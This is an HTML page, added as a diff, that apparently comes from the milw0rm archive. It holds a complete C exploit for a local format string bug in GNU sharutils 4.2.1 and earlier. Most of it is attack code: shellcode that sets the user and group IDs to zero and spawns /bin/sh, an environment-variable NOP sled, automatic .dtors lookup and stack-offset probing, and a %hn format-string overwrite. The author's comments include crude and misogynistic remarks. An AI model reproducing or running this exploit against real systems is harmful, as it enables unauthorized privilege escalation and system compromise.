@@ -1,0 +1,348 @@
+<html>
+<head>
+<title>GNU sharutils <= 4.2.1 Local Format String POC Code</title>
+<pre>
+/* GNU sharutils &lt;= 4.2.1 Local Format String POC Code
+   
+   C0ded by n4rk0tix (a.k.a nrktx) narkotix@linuxmail.org
+   
+   Below is a l4m3 proof of concept code for da recently reported lame bug;
+   These binaryz have not only format bugz, but also buffer overflowz,etc.We also
+   exploited the heap and the stack hole of theze binaryz.There are almost 3 wayz of exploiting
+   theze elfz ,both of them r fucking boring , though, so this one is.
+   
+   candy@labs:/$ readelf -r `which shar` | grep uid
+   08050784 00000e07 R_386_JUMP_SLOT 08048d7c getpwuid
+   080507e0 00002807 R_386_JUMP_SLOT 08048eec getuid
+   candy@labs:/$
+   
+    exploiting non-suid binariez is like fucking 55 yearz old woman, like i did in this code :-]
+    I'm again BACK from a long cisco trip, REGROUP TEAM, go go go... , need back up ! :]
+   
+    Also some greetingz signaled to: Efnet,gotcha(love from .*za :] ),dm(my netmate from madagaskar),
+         genjuro(my lord a.k.a Uz4yh4N),L4M3R(vurun la ipnelere ehuehu,kibriti caktim, tinerci alisti ehuehe),
+         HELl0wEeN,darkhat,mathmonkey,mtrl(68000 guru),jawz,and the otherz whom i excluded them accidently :)
+   
+   For More Info , read the below ascii trash. Thanx _EOF_
+*/
+   
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;strings.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;err.h&gt;
+#include &lt;errno.h&gt;
+
+#define _GNU_SOURCE
+#define DEFAULT_DTORS_SHAR (0x08050738) /*Tested on Slackware 9.0*/
+#define DEFAULT_DTORS_UNSHAR (0x0804ad74) /* This is not exploitable on every systemz */
+#define DEFAULT_OFFSET_SHAR 22
+#define DEFAULT_OFFSET_UNSHAR 262 /*lol, wtf stack layout do i have :],Probably useless..*/
+#define SHAR_PATH &quot;/usr/bin/shar&quot; /*Default $PATH change if needed*/
+#define UNSHAR_PATH &quot;/usr/bin/unshar&quot;
+#define GET_DTORS_CMD &quot;objdump -h %s | grep .dtors | awk ' { print $4 } ' &gt; %s&quot;
+#define NOP 0x90
+
+static int16_t WBIN = 2;
+
+int main(void) {
+        
+int16_t check_bin(void);
+u_int32_t get_dtors(int8_t* path);
+int16_t get_auto_stack_offset(int8_t *binpath);
+void banner(void);
+
+int8_t envbuf[1000];
+int8_t store_env[1010];
+int8_t *shar_path = SHAR_PATH;
+int8_t *unshar_path = UNSHAR_PATH;
+static u_int8_t shellcode[] = // setreuid(0,0)
+        &quot;\x31\xc0&quot; // xor %eax,%eax
+        &quot;\x31\xdb&quot; // xor %ebx,%ebx
+        &quot;\x31\xc9&quot; // xor %ecx,%ecx
+        &quot;\xb0\x46&quot; // mov $0x46,%al
+        &quot;\xcd\x80&quot; // int $0x80
+        
+        // setgid(0)
+        &quot;\x31\xdb&quot; // xor %ebx,%ebx
+        &quot;\x89\xd8&quot; // mov %ebx,%eax
+        &quot;\xb0\x2e&quot; // mov $0x2e,%al
+        &quot;\xcd\x80&quot; // int $0x80
+        
+        // execve /bin/sh
+        &quot;\x31\xc0&quot; // xor %eax,%eax
+        &quot;\x50&quot; // push %eax
+        &quot;\x68\x2f\x2f\x73\x68&quot; // push $0x68732f2f
+        &quot;\x68\x2f\x62\x69\x6e&quot; // push $0x6e69622f
+        &quot;\x89\xe3&quot; // mov %esp,%ebx
+        &quot;\x8d\x54\x24\x08&quot; // lea 0x8(%esp,1),%edx
+        &quot;\x50&quot; // push %eax
+        &quot;\x53&quot; // push %ebx
+        &quot;\x8d\x0c\x24&quot; // lea (%esp,1),%ecx
+        &quot;\xb0\x0b&quot; // mov $0xb,%al
+        &quot;\xcd\x80&quot; // int $0x80
+ 
+        // exit();
+        &quot;\x31\xc0&quot; // xor %eax,%eax
+        &quot;\xb0\x01&quot; // mov $0x1,%al
+        &quot;\xcd\x80&quot;; // int $0x80
+ 
+     
+banner();
+if(!check_bin())
+exit(EXIT_FAILURE);
+ 
+memset(envbuf,NOP,sizeof(envbuf));
+strcpy((int8_t *)&amp;envbuf[sizeof(envbuf) - strlen(shellcode)],shellcode);
+memcpy(store_env,&quot;CANDY=&quot;,6);
+strcat(store_env,envbuf);
+putenv(store_env);
+ if(!putenv) {
+   if(errno == ENOMEM) {
+   strerror(errno);
+   exit(EXIT_FAILURE);
+   }
+ }
+const int8_t *USEBIN;
+int16_t USE_OFFSET;
+        
+if(WBIN == 1){
+printf(&quot;[+]Exploiting the unshar binary\n&quot;);
+USEBIN = unshar_path;
+}
+if(WBIN == 2){
+printf(&quot;[+]Default binary is shar\n&quot;);
+USEBIN = shar_path;
+}
+if(WBIN == 3) {
+printf(&quot;[+]Exploiting Shar binary\n&quot;);
+USEBIN = shar_path;
+}
+        
+int8_t store[200];
+
+u_int32_t fakebuf = 0xbffffffa - strlen(store_env) - strlen(&quot;/usr/bin/shar&quot;) + 50;
+        
+u_int32_t write_dtors = get_dtors((int8_t *)USEBIN);
+int8_t *dtors_target[3] =
+        
+               { (int8_t *) write_dtors + 2,
+                 (int8_t *) write_dtors,
+                  NULL
+               };
+        
+ 
+int16_t env_most,
+         env_low;
+
+
+env_most = (fakebuf &amp; 0xffff0000) &gt;&gt; 16 ;
+env_low = (fakebuf &amp; 0x0000ffff);
+
+
+env_most -= 0x8;
+USE_OFFSET = get_auto_stack_offset((int8_t *)USEBIN);
+ 
+sprintf(store,&quot;%s%%.%dx%%%d$hn%%.%dx%%%d$hn&quot;,
+   
+                &amp;dtors_target,
+                (u_int16_t)env_most,
+                USE_OFFSET,
+                (env_low - env_most) - 0x8,
+
+
+                USE_OFFSET + 1);
+
+fprintf(stdout,&quot;[+]Type some command,sh$ prompt may not occur\n&quot;);
+fprintf(stdout,&quot;[+]Terminal echoing is possibly off \n&quot;);
+fprintf(stdout,&quot;Type any shell command Here i.e 'id' or 'ps aux'\n&quot;);
+execlp(USEBIN,USEBIN,store);
+fflush(stdin);
+fflush(stdout);
+return EXIT_SUCCESS; // useless, never return
+}
+
+
+
+
+int16_t check_bin(void) {
+ 
+ int8_t *filename_shar = SHAR_PATH;
+ int8_t *filename_unshar = UNSHAR_PATH;
+ int16_t i = 2;
+  if( access(filename_shar,F_OK) != 0){
+   fprintf(stderr,&quot;%s Not found, Checking %s\n&quot;,filename_shar,filename_unshar);
+   i--;
+   WBIN = 1;
+   }
+
+ if( access(filename_unshar,F_OK) != 0) {
+  fprintf(stderr,&quot;%s Not found\n&quot;,filename_unshar);
+   i--;
+   WBIN = (WBIN == 1) ? 0 : 3;
+   }
+ if(!i) {
+   fprintf(stderr,&quot;Sorry dude, no binary available for exploiting.\n&quot;);
+   exit(EXIT_FAILURE);
+   }
+ fputs(&quot;[+]Binary checking passed\n&quot;,stdout);
+ return(i);
+}
+
+u_int32_t get_dtors(int8_t* path) {
+ 
+ FILE *readit;
+ int *tmpfile;
+ int8_t tmpfull[32];
+ char *store_dtors;
+ 
+ int16_t status;
+ int16_t length;
+ 
+ ssize_t read;
+ u_int32_t findme;
+ int8_t *dtorsbuf = NULL;
+ bzero((int8_t *)tmpfull,sizeof(tmpfull));
+ 
+ strncpy(tmpfull,&quot;/tmp/candyXXXXXX&quot;,strlen(&quot;/tmp/candyXXXXXX&quot;));
+ tmpfile = (int *)mkstemp((int8_t *)tmpfull);
+ int8_t *buffer = (int8_t *) malloc(100 * sizeof(int8_t *));
+ if(!malloc) { err(1,&quot;malloc&quot;); exit(EXIT_FAILURE); }
+ 
+ bzero(buffer,sizeof(buffer));
+ snprintf(buffer,100,GET_DTORS_CMD,path,tmpfull);
+ buffer[strlen(buffer)] = '\0';
+ 
+ int8_t *shar_path = SHAR_PATH;
+ status = system(buffer);
+ 
+
+ switch((status &gt;&gt; 8 ) &amp; 0xff) {
+          
+          case 0:
+          fprintf(stdout,&quot;[+]Utilities check successful, no Need Defaults\n&quot;);
+          break;
+          
+          case !0:
+          fprintf(stdout,&quot;[+]Using default .Dtors address\n&quot;);
+          findme = (path == shar_path) ? DEFAULT_DTORS_SHAR : DEFAULT_DTORS_UNSHAR;
+          goto GO_ON;
+          
+          default:
+          fprintf(stdout,&quot;[+]Using default .Dtors address\n&quot;);
+          fprintf(stdout,&quot;[+]Dtors address =&gt; 0x%x\n&quot;,DEFAULT_DTORS_SHAR );
+          findme = (path == shar_path) ? DEFAULT_DTORS_SHAR : DEFAULT_DTORS_UNSHAR;
+          goto GO_ON;
+   }
+    
+ 
+       
+       if ( (readit = fopen(tmpfull,&quot;rb&quot;)) == NULL ) {
+          strerror(errno);
+          fprintf(stdout,&quot;[+]Using default .Dtors address\n&quot;);
+          findme = (path == shar_path) ? DEFAULT_DTORS_SHAR : DEFAULT_DTORS_UNSHAR;
+          goto GO_ON;
+          }
+          read = getline(&amp;dtorsbuf,&amp;length,readit);
+       
+     fflush(readit);
+     dtorsbuf[strlen(dtorsbuf) -1 ] = '\0';
+     findme = strtoul(dtorsbuf,&amp;store_dtors,16);
+     
+     fclose(readit);
+     free(dtorsbuf);
+     unlink(tmpfull);
+     fprintf(stdout,&quot;[+]Dtors address found =&gt; 0x%x\n&quot;,findme + 0x4);
+GO_ON:
+     unlink(tmpfull); /* For System Crashes */
+     return(findme + 4);
+}
+ 
+
+int16_t get_auto_stack_offset(int8_t *binpath) {
+
+ int8_t *path = &quot;/tmp/candy&quot;;
+ int8_t *buffer = (int8_t *)malloc(300*sizeof(int8_t));
+ int8_t *shar_path = SHAR_PATH;
+ 
+ FILE *fd;
+ static int8_t formatbuf[100];
+ const u_int8_t *end_the_format = &quot;41414141&quot;;
+ 
+ int8_t *format_string = &quot;%x&quot;;
+ int8_t progpath[40];
+ 
+ bzero(progpath,sizeof(progpath));
+ sprintf(progpath,&quot;%s AAAA&quot;,binpath);
+ progpath[strlen(progpath)] = '\0';
+ 
+ static int16_t control = 1;
+ static int16_t offset = 1;
+     if ((fd = fopen(path,&quot;wb&quot;)) == NULL) {
+     perror(&quot;fopen&quot;);
+     exit(1);
+    }
+ if(control != 1)
+ goto FIRSTJUMP;
+
+ fflush(stderr);
+ dup2(fileno(fd),2);
+ 
+ bzero(formatbuf,sizeof(formatbuf));
+ strncpy(formatbuf,progpath,strlen(progpath));
+  
+LOOP:
+    if ((fd = fopen(path,&quot;wb&quot;)) == NULL) {
+      perror(&quot;fopen&quot;);
+      exit(1);
+      }
+ fflush(stderr);
+ dup2(fileno(fd),2);
+
+FIRSTJUMP:
+ 
+ control++;
+ strcat(formatbuf,format_string);
+ 
+ system(formatbuf);
+ fclose(fd);
+ usleep(9999);
+ 
+ fd = fopen(path,&quot;rb&quot;);
+ if(fd == NULL){
+ perror(&quot;open&quot;);
+ fprintf(stdout,&quot;[+]Using default Stack Offset \n&quot;);
+ offset = (binpath == shar_path) ? DEFAULT_OFFSET_SHAR : DEFAULT_OFFSET_UNSHAR;
+ goto JUMP;
+ }
+    
+   if(fgets(buffer,300,fd) != NULL){
+
+     if( strstr(buffer,end_the_format) == NULL) {
+     free(buffer);
+     fclose(fd);
+     offset++;
+     goto LOOP;
+     }
+     
+ free(buffer);
+ fclose(fd);
+ unlink(path);
+}
+ fprintf(stdout,&quot;[+]Using Stack Offset %d\n&quot;,offset);
+ JUMP:
+ return(offset);
+ }
+
+void banner(void) {
+fputs(&quot;\tGNU SharUtils &lt;= 4.2.1 Local Format String Exploit\n&quot;
+      &quot;\tnarkotix@linuxmail.org\n&quot;,stdout);
+}
+</pre>
+// milw0rm.com [2004-09-25]
+</html>
+
